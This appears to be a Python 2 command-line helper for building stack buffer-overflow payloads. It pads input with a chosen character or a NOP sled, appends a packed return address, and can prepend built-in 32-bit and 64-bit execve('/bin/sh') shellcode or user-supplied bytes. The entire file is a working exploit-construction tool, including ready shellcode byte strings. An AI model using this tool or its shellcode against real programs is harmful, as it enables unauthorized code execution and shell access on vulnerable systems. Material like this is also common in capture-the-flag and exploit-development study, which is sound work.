#!/usr/bin/env python2
import struct
import argparse
import re
import sys 

parser = argparse.ArgumentParser()
parser.add_argument("-l", "--length", default=0, type=int, help="overlow length")
parser.add_argument("-c", "--char", default="a", help="char to use")
parser.add_argument("-a", "--address", default="0xbaddcafe", help="address to add")
parser.add_argument("-e", "--exec-bash", action="store_true", help="prepend string with 'execve('/bin/sh')' shellcode")
parser.add_argument("--exec-bash64", action="store_true", help="prepend string with 64 bit 'execve('/bin/sh')' shellcode")
parser.add_argument("-s", "--shellcode", default=False, help="prepend string with given shellcode")
parser.add_argument("--no-addr", default=False, action="store_true", help="do not add an address to end of string")
parser.add_argument("-n", "--nop-sled", default=False, action="store_true", help="shorthand for setting c to \x90, overrides char option")
parser.add_argument("-p", "--print-shellcode", action="store_true", help="prints only supplied shellcode, works with --exec-bash commands")
parser.add_argument("-w", "--write-python", action="store_true", help="writes python code to stdout that will write desired output")

args = parser.parse_args()
error = sys.stderr.write
write = sys.stdout.write

def repl(m):
  return chr(int(m.group(1).strip(),16))


if __name__ == "__main__":

    shellcode = ""

    c = args.char.decode("string_escape")

    if args.nop_sled:
        c='\x90' 

    try:
        addr=int(args.address, 0)
    except:
        error("invalid address\n")
        exit(-1)

    addr=struct.pack("<I",addr) 

    if args.shellcode:
        shellcode=args.shellcode.decode("string_escape")
    elif args.exec_bash:
        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    elif args.exec_bash64:
        shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
 
    if args.print_shellcode:
        write(shellcode)
        exit(0)

    if args.no_addr:
        addr = ""

    if len(shellcode) > args.length:
        args.length = len(shellcode)
    if not args.write_python:
        write(c*(max(args.length-len(shellcode)-len(addr), 0))+shellcode+addr)
    else:
        write("python -c 'print \"{}\"*{}+\"{}\"+\"{}\"'".format(
            c.encode("string_escape"),
            args.length-len(shellcode)-len(addr),
            shellcode.encode("string_escape"),
            addr.encode("string_escape")))

